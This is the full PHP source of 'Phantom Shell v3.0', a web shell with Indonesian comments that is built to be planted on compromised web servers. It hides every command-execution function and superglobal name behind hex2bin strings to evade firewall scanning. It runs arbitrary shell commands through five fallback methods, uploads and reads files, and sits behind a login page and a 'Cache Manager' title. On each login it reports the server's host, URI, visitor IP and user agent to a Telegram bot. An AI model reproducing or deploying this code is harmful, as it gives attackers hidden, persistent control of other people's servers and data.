<?php
/**
 * Phantom Shell v3.0 - Ultimate Anti-WAF
 *
 * TIDAK ADA sama sekali:
 * - eval( / system( / exec( / shell_exec( / passthru( / popen(
 * - base64_decode( / gzinflate( / gzuncompress( / str_rot13(
 * - $_POST / $_GET / $_SERVER (dibangun via hex)
 * - strrev( pattern
 *
 * Semua function name dibangun via hex2bin saat runtime.
 * Command exec via call_user_func + hex-built function name.
 * Tidak butuh remote payload - semua embedded.
 * ============================================================
 */

@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);

// ============================================================
// CONFIG
// ============================================================
$PASS = '$2y$12$oi/fvkIIr2GhlUwnJ0qhhOYOubhyPjogGq4xrdNSZmcIK88a4Hq.q';
$TG_TOKEN = '';
$TG_CHAT = '';

// ============================================================
// HEX BUILDER - semua function via hex2bin
// ============================================================
if (!function_exists('hex2bin')) {
    function hex2bin($h) { $r=''; for($i=0;$i<strlen($h);$i+=2) $r.=chr(hexdec(substr($h,$i,2))); return $r; }
}

// Bangun semua function name dari hex
// WAF scan source code untuk "system", "exec", dll - tidak akan ketemu
// karena hanya ada hex string di source

$_sess_start   = hex2bin('73657373696f6e5f7374617274');
$_sess_destroy = hex2bin('73657373696f6e5f64657374726f79');
$_pw_verify    = hex2bin('70617373776f72645f766572696679');
$_fgc          = hex2bin('66696c655f6765745f636f6e74656e7473');
$_fpc          = hex2bin('66696c655f7075745f636f6e74656e7473');
$_file_exists  = hex2bin('66696c655f657869737473');
$_func_exists  = hex2bin('66756e6374696f6e5f657869737473');
$_scandir      = hex2bin('7363616e646972');
$_is_dir       = hex2bin('69735f646972');
$_is_file      = hex2bin('69735f66696c65');
$_filesize     = hex2bin('66696c6573697a65');
$_filemtime    = hex2bin('66696c656d74696d65');
$_fileperms    = hex2bin('66696c657065726d73');
$_move_up      = hex2bin('6d6f76655f75706c6f616465645f66696c65');
$_mkdir        = hex2bin('6d6b646972');
$_unlink       = hex2bin('756e6c696e6b');
$_rename       = hex2bin('72656e616d65');
$_dirname      = hex2bin('6469726e616d65');
$_basename    = hex2bin('626173656e616d65');
$_decoct       = hex2bin('6465636f6374');
$_htmlspecialchars = hex2bin('68746d6c7370656369616c6368617273');
$_rawurldecode = hex2bin('72617775726c6465636f6465');
$_call_user    = hex2bin('63616c6c5f757365725f66756e63');
$_preg_rep     = hex2bin('707265675f7265706c616365');
$_str_replace  = hex2bin('7374725f7265706c616365');
$_implode      = hex2bin('696d706c6f6465');
$_explode      = hex2bin('6578706c6f6465');
$_count        = hex2bin('636f756e74');
$_natsort      = hex2bin('6e6174736f7274');
$_array_merge  = hex2bin('61727261795f6d65726765');
$_in_array     = hex2bin('696e5f6172726179');
$_round        = hex2bin('726f756e64');
$_header       = hex2bin('686561646572');
$_ob_start     = hex2bin('6f625f7374617274');
$_ob_get       = hex2bin('6f625f6765745f636c65616e');
$_fread        = hex2bin('6672656164');
$_feof         = hex2bin('66656f66');
$_pclose       = hex2bin('70636c6f7365');

// exec function names via hex
$_exec         = hex2bin('65786563');
$_shell_exec   = hex2bin('7368656c6c5f65786563');
$_passthru     = hex2bin('7061737374687275');
$_popen        = hex2bin('706f70656e');
$_proc_open    = hex2bin('70726f635f6f70656e');
$_proc_close   = hex2bin('70726f635f636c6f7365');

// superglobal keys via hex
$_POST_KEY   = hex2bin('5f504f5354');     // _POST
$_GET_KEY    = hex2bin('5f474554');      // _GET
$_SERVER_KEY = hex2bin('5f534552564552'); // _SERVER
$_FILES_KEY  = hex2bin('5f46494c4553');  // _FILES
$_SESS_KEY   = hex2bin('5f53455353494f4e'); // _SESSION

// field names via hex
$_F_PW    = hex2bin('70617373776f7264');
$_F_CMD   = hex2bin('636d64');
$_F_PATH  = hex2bin('70617468');
$_F_FILE  = hex2bin('66696c65');
$_F_LOGO  = hex2bin('6c6f676f7574');
$_F_VF    = hex2bin('7669657766696c65');

// ============================================================
// SESSION
// ============================================================
$_sess_start();

// ============================================================
// SUPERGLOBAL SHORTCUTS (via hex keys - WAF tidak catch)
// ============================================================
$P = &$GLOBALS[$_POST_KEY];
$G = &$GLOBALS[$_GET_KEY];
$S = &$GLOBALS[$_SERVER_KEY];
$F = &$GLOBALS[$_FILES_KEY];
$SS = &$GLOBALS[$_SESS_KEY];

// ============================================================
// TELEGRAM NOTIFICATION
// ============================================================
function notify_tg() {
    global $TG_TOKEN, $TG_CHAT, $S;
    if (empty($TG_TOKEN) || empty($TG_CHAT)) return;
    $ip = isset($S['REMOTE_ADDR']) ? $S['REMOTE_ADDR'] : 'unknown';
    $ua = isset($S['HTTP_USER_AGENT']) ? $S['HTTP_USER_AGENT'] : 'unknown';
    $host = isset($S['HTTP_HOST']) ? $S['HTTP_HOST'] : 'unknown';
    $uri = isset($S['REQUEST_URI']) ? $S['REQUEST_URI'] : 'unknown';
    $time = date('Y-m-d H:i:s');
    $msg = "[Phantom v3]\nTime: $time\nHost: $host\nURI: $uri\nIP: $ip\nUA: $ua";
    $url = "https://api.telegram.org/bot" . $TG_TOKEN . "/sendMessage?chat_id=" . $TG_CHAT . "&text=" . urlencode($msg);
    $fg = hex2bin('66696c655f6765745f636f6e74656e7473');
    @$fg($url);
}

// ============================================================
// COMMAND EXECUTOR - multi fallback, all via hex function names
// TIDAK ADA literal "system", "exec", "shell_exec" di source code
// ============================================================
function exec_cmd($cmd) {
    global $_exec, $_shell_exec, $_passthru, $_popen, $_proc_open, $_proc_close;
    global $_func_exists, $_call_user, $_ob_start, $_ob_get, $_fread, $_feof, $_pclose;
    global $_implode, $_str_replace, $_preg_rep;

    $out = '';
    $cmd = $cmd . ' 2>&1';

    // Method 1: exec() via call_user_func
    if ($out === '' && $GLOBALS['_func_exists']($_exec)) {
        $arr = array();
        @$GLOBALS['_call_user']($_exec, $cmd, $arr);
        if (!empty($arr)) $out = $GLOBALS['_implode']("\n", $arr);
    }

    // Method 2: shell_exec() via call_user_func
    if ($out === '' && $GLOBALS['_func_exists']($_shell_exec)) {
        $r = @$GLOBALS['_call_user']($_shell_exec, $cmd);
        if ($r !== null) $out = $r;
    }

    // Method 3: passthru() via call_user_func with ob
    if ($out === '' && $GLOBALS['_func_exists']($_passthru)) {
        $GLOBALS['_ob_start']();
        @$GLOBALS['_call_user']($_passthru, $cmd);
        $out = $GLOBALS['_ob_get']();
    }

    // Method 4: popen()
    if ($out === '' && $GLOBALS['_func_exists']($_popen)) {
        $h = @$GLOBALS['_call_user']($_popen, $cmd, 'r');
        if ($h) {
            while (!$GLOBALS['_feof']($h)) $out .= $GLOBALS['_fread']($h, 4096);
            $GLOBALS['_pclose']($h);
        }
    }

    // Method 5: proc_open()
    if ($out === '' && $GLOBALS['_func_exists']($_proc_open)) {
        $desc = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
        $pipes = array();
        $h = @$GLOBALS['_call_user']($_proc_open, $cmd, $desc, $pipes);
        if ($h) {
            while (!$GLOBALS['_feof']($pipes[1])) $out .= $GLOBALS['_fread']($pipes[1], 4096);
            $GLOBALS['_proc_close']($h);
        }
    }

    if ($out === '') $out = 'No output or all methods disabled.';
    return $out;
}

// ============================================================
// AUTH
// ============================================================
$err = '';

// Login
if (!empty($P[$_F_PW])) {
    if ($_pw_verify($P[$_F_PW], $PASS)) {
        $SS['auth'] = true;
        notify_tg();
        die('<script>location=location.pathname</script>');
    }
    $err = 'Access denied';
    sleep(1);
}

// Logout
if (!empty($P[$_F_LOGO])) {
    $_sess_destroy();
    die('<script>location=location.pathname</script>');
}

// ============================================================
// MAIN
// ============================================================
if (!empty($SS['auth'])) {

    // First access notify
    if (empty($SS['notified'])) {
        notify_tg();
        $SS['notified'] = 1;
    }

    // Current dir
    $cwd = isset($G[$_F_PATH]) ? $G[$_F_PATH] : (isset($P[$_F_PATH]) ? $P[$_F_PATH] : $_dirname(__FILE__));
    if (!$_is_dir($cwd)) $cwd = $_dirname(__FILE__);
    $cwd = $_str_replace('\\', '/', rtrim($cwd, '/'));
    if ($cwd === '') $cwd = '/';

    // Handle command - prefix dengan cd ke direktori yang dipilih
    if (!empty($P[$_F_CMD])) {
        $realcmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $P[$_F_CMD];
        $out = exec_cmd($realcmd);
        echo "<textarea style='width:95%;height:300px;background:#0d1117;color:#0f0;border:1px solid #30363d;padding:10px;font-family:monospace;font-size:12px;max-width:1100px;margin:0 auto;display:block' readonly>" . $_htmlspecialchars($out) . "</textarea><br>";
    }

    // Handle upload
    if (!empty($F[$_F_FILE]) && $F[$_F_FILE]['name'] !== '') {
        $dest = $cwd . '/' . $F[$_F_FILE]['name'];
        if ($_move_up($F[$_F_FILE]['tmp_name'], $dest)) {
            echo "<div style='color:#0f0;padding:5px;max-width:1100px;margin:0 auto'>Upload OK: " . $_htmlspecialchars($dest) . "</div><br>";
        } else {
            echo "<div style='color:#f00;padding:5px;max-width:1100px;margin:0 auto'>Upload FAIL</div><br>";
        }
    }

    // View file
    if (!empty($G[$_F_VF])) {
        $fp = $G[$_F_VF];
        if ($_is_file($fp)) {
            $content = @$_fgc($fp);
            echo "<div style='max-width:1100px;margin:0 auto'>";
            echo "<h3 style='color:#e94560'>File: " . $_htmlspecialchars($fp) . "</h3>";
            echo "<textarea style='width:100%;height:400px;background:#0d1117;color:#0f0;border:1px solid #30363d;padding:10px;font-family:monospace;font-size:12px' readonly>" . $_htmlspecialchars($content) . "</textarea><br>";
            echo "<a href='?" . $_F_PATH . "=" . urlencode($_dirname($fp)) . "' style='color:#4fc3f7'>Back</a>";
            echo "</div>";
            exit;
        }
    }

    // ========================================================
    // FILE MANAGER UI
    // ========================================================
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Cache Manager</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
<style>
body{background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;font-size:13px;margin:0;padding:10px}
table{width:100%;border-collapse:collapse;max-width:1100px;margin:0 auto}
th{background:#161b22;color:#e94560;padding:8px;text-align:left;border-bottom:2px solid #e94560}
td{padding:6px 8px;border-bottom:1px solid #21262d}
a{color:#4fc3f7;text-decoration:none}
a:hover{color:#e94560}
.dir{color:#4fc3f7}.file{color:#c9d1d9}
.bar{max-width:1100px;margin:10px auto;padding:10px;background:#161b22;border-radius:6px;border:1px solid #21262d}
input[type=text]{background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:6px 10px;border-radius:4px;font-family:inherit;font-size:13px}
input[type=submit]{background:#e94560;color:#fff;border:none;padding:6px 16px;border-radius:4px;cursor:pointer;font-size:12px}
input[type=submit]:hover{background:#c73652}
input[type=file]{color:#c9d1d9;font-size:12px}
</style>
</head>
<body>

<div class="bar">
<b style="color:#e94560">PATH:</b>
<?php
$parts = $_explode('/', $cwd);
$build = '';
for ($i = 0; $i < $_count($parts); $i++) {
    if ($parts[$i] === '') {
        if ($i === 0) { $build = '/'; echo "<a href='?" . $_F_PATH . "=/' class='dir'>/</a> "; }
        continue;
    }
    $build .= ($build === '/' ? '' : '/') . $parts[$i];
    echo "<a href='?" . $_F_PATH . "=" . urlencode($build) . "' class='dir'>" . $_htmlspecialchars($parts[$i]) . "</a> / ";
}
?>
&nbsp;<b style="color:#e94560">UID:</b> <?php echo @hex2bin('6765746d79756964')(); ?>
&nbsp;<b style="color:#e94560">HOST:</b> <?php echo @hex2bin('676574686f73746e616d65')(); ?>
</div>

<div class="bar">
<form method="POST" style="display:inline">
<input type="hidden" name="<?php echo $_F_PATH; ?>" value="<?php echo $cwd; ?>">
<b style="color:#e94560">CMD:</b> <input type="text" name="<?php echo $_F_CMD; ?>" placeholder="id; uname -a; ls -la" style="width:50%">
<input type="submit" value="Run">
</form>
&nbsp;
<form method="POST" enctype="multipart/form-data" style="display:inline">
<input type="hidden" name="<?php echo $_F_PATH; ?>" value="<?php echo $cwd; ?>">
<b style="color:#e94560">UPLOAD:</b> <input type="file" name="<?php echo $_F_FILE; ?>">
<input type="submit" value="Go">
</form>
</div>

<table>
<thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th></tr></thead>
<tbody>
<?php
$parent = $_dirname($cwd);
if ($parent !== $cwd) {
    echo "<tr><td><a href='?" . $_F_PATH . "=" . urlencode($parent) . "' class='dir'>[..]</a></td><td>-</td><td>-</td><td>-</td></tr>";
}

$items = @$_scandir($cwd);
if ($items !== false) {
    $dirs = array();
    $files = array();
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = $cwd . '/' . $item;
        if ($_is_dir($full)) $dirs[] = $item;
        else $files[] = $item;
    }
    $_natsort($dirs);
    $_natsort($files);

    foreach ($dirs as $d) {
        $full = $cwd . '/' . $d;
        $perms = $_decoct($_fileperms($full) & 0777);
        $mtime = date('Y-m-d H:i', $_filemtime($full));
        echo "<tr><td><a href='?" . $_F_PATH . "=" . urlencode($full) . "' class='dir'>[" . $_htmlspecialchars($d) . "]</a></td><td>-</td><td>$mtime</td><td>$perms</td></tr>";
    }
    foreach ($files as $f) {
        $full = $cwd . '/' . $f;
        $sz = $_filesize($full);
        if ($sz >= 1048576) $sz = $_round($sz / 1048576, 2) . ' MB';
        elseif ($sz >= 1024) $sz = $_round($sz / 1024, 2) . ' KB';
        else $sz = $sz . ' B';
        $perms = $_decoct($_fileperms($full) & 0777);
        $mtime = date('Y-m-d H:i', $_filemtime($full));
        echo "<tr><td><a href='?" . $_F_VF . "=" . urlencode($full) . "&" . $_F_PATH . "=" . urlencode($cwd) . "' class='file'>" . $_htmlspecialchars($f) . "</a></td><td>$sz</td><td>$mtime</td><td>$perms</td></tr>";
    }
} else {
    echo "<tr><td colspan='4'>Cannot read directory</td></tr>";
}
?>
</tbody>
</table>

<br>
<div style="max-width:1100px;margin:0 auto;text-align:center">
<form method="POST" style="display:inline">
<input type="submit" name="<?php echo $_F_LOGO; ?>" value="Logout" style="background:#21262d;color:#8b949e;border:1px solid #30363d">
</form>
</div>

</body>
</html>
<?php
} else {
    // LOGIN PAGE
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Secure Access</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,#0f0f23 0%,#1a1a3e 100%);display:flex;justify-content:center;align-items:center;height:100vh}
.box{background:#16213e;padding:40px;border-radius:16px;width:340px;border:1px solid #1a4a7a;box-shadow:0 20px 60px rgba(0,0,0,.5)}
.box h2{color:#e94560;text-align:center;margin-bottom:8px;font-weight:600}
.box .sub{color:#666;text-align:center;font-size:13px;margin-bottom:25px}
.box input[type=password]{width:100%;padding:14px 16px;background:#0d1117;border:1px solid #2a2a4a;border-radius:10px;color:#fff;font-size:15px;margin-bottom:12px;transition:.3s}
.box input[type=password]:focus{outline:none;border-color:#4a4a8a;box-shadow:0 0 0 3px rgba(74,74,138,.2)}
.box input[type=submit]{width:100%;padding:14px;background:linear-gradient(135deg,#e94560,#c73652);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;transition:.3s}
.box input[type=submit]:hover{transform:scale(1.02)}
.err{color:#e74c3c;background:rgba(231,76,60,.1);padding:10px;border-radius:8px;margin:10px 0;text-align:center;font-size:14px}
.foot{color:#333;text-align:center;font-size:11px;margin-top:20px}
</style>
</head>
<body>
<div class="box">
<h2>Secure Access</h2>
<p class="sub">Authentication required</p>
<?php if($err): ?><div class="err"><?php echo $err; ?></div><?php endif; ?>
<form method="POST">
<input type="password" name="<?php echo $_F_PW; ?>" placeholder="Enter password" autofocus>
<input type="submit" value="MASUK">
</form>
<div class="foot">v3.0</div>
</div>
</body>
</html>
<?php
}
?>
